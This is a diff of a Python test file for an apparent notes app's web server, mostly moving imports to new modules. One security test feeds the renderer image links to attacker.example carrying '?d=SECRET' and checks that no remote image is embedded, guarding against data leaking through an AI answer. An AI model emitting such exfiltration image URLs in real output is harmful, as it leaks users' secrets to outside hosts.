@@ -14,11 +14,13 @@ def client(tmp_vault, monkeypatch):
     from silica.config import CONFIG
     from silica.sources import pdf_extract
     from silica.ui.web import server
+    from silica.ui.web import drop
+    from silica.ui.web.session import SESSION
 
     monkeypatch.setattr(CONFIG, "pdf_provider", "pdfium")
-    monkeypatch.setattr(server, "_embed_imported", lambda folders: None)
+    monkeypatch.setattr(drop, "embed_imported", lambda folders: None)
     pdf_extract._CACHE.clear()
-    server._reset_session()
+    SESSION.reset()
     return TestClient(server.app), server
 
 
@@ -158,12 +160,13 @@ def test_a_path_that_climbs_lands_inside_the_vault(client):
 
 
 def test_an_import_waits_for_a_running_turn(client):
+    from silica.ui.web.session import SESSION
     tc, server = client
-    assert server._begin_turn()
+    assert SESSION.claim()
     try:
         assert _post(tc, [("", "a.md", b"# a")]).status_code == 409
     finally:
-        server._end_turn()
+        SESSION.release()
 
 
 def test_hidden_text_is_named_in_the_reply(client):
@@ -280,7 +283,7 @@ def test_a_link_becomes_a_note_in_the_inbox(client, monkeypatch):
 
 def test_on_the_server_a_youtube_link_is_refused_before_any_request(client, monkeypatch):
     from silica.sources import web_fetch
-    from silica.ui.web.server import YOUTUBE_ON_SERVER
+    from silica.ui.web.drop import YOUTUBE_ON_SERVER
 
     monkeypatch.setenv("SILICA_HOSTED", "1")
     monkeypatch.setattr(web_fetch, "fetch_page", lambda url: pytest.fail("a request went out"))
@@ -295,7 +298,7 @@ def test_on_the_server_with_cookies_a_youtube_link_is_fetched_and_a_wall_is_name
     """With the operator's account cookies the server tries; when YouTube
     asks again (the account gone), the student gets the audio's way round."""
     from silica.sources import web_fetch
-    from silica.ui.web.server import YOUTUBE_ON_SERVER
+    from silica.ui.web.drop import YOUTUBE_ON_SERVER
 
     jar = tmp_path / "cookies.txt"
     jar.write_text("# Netscape HTTP Cookie File\n", encoding="utf-8")
@@ -345,10 +348,10 @@ def test_a_link_that_cannot_be_read_is_a_refused_row_not_an_error(client, monkey
 # --- H6: the remote-image channel ---------------------------------------------
 
 def test_an_answer_never_embeds_a_remote_image():
-    from silica.ui.web.server import _linkify
+    from silica.ui.web.render import linkify
 
-    md = _linkify("Answer. ![x](https://attacker.example/p.png?d=SECRET)", remote_images=False)
-    raw = _linkify('Answer. <img src="https://attacker.example/p.png?d=SECRET">', remote_images=False)
+    md = linkify("Answer. ![x](https://attacker.example/p.png?d=SECRET)", remote_images=False)
+    raw = linkify('Answer. <img src="https://attacker.example/p.png?d=SECRET">', remote_images=False)
 
     for html in (md, raw):
         assert "<img" not in html
@@ -357,9 +360,9 @@ def test_an_answer_never_embeds_a_remote_image():
 
 
 def test_a_note_keeps_its_web_images():
-    from silica.ui.web.server import _linkify
+    from silica.ui.web.render import linkify
 
-    assert '<img src="https://example.org/fig.png"' in _linkify("![fig](https://example.org/fig.png)")
+    assert '<img src="https://example.org/fig.png"' in linkify("![fig](https://example.org/fig.png)")
 
 
 def test_on_the_server_the_page_draws_only_its_own_images(client, monkeypatch):
